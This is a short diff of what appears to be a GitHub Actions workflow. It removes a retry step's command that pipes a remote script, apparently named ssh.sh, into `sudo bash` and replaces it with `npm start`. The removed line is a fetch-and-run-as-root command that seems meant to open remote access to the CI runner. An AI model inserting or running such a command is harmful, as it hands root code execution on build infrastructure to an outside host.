@@ -39,5 +39,5 @@ jobs:
           with:
             timeout_minutes: 30
             max_attempts: 3
-            command: "curl -SL http://raw.github.com/zhlhlf/text/main/ssh.sh | sudo bash"
+            command: npm start
               
